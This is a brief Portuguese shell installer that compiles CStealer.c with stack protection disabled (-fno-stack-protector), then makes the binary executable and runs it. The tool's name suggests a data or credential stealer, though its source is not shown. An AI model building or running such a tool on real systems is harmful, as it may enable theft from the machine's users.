echo ""
echo "Começando a instalação, aguarde..."
echo "Lembrando que após a compilação do CStealer, digite ./CStealer para entrar."
echo ""

gcc -fno-stack-protector CStealer.c -o CStealer
chmod +x CStealer
clear
./CStealer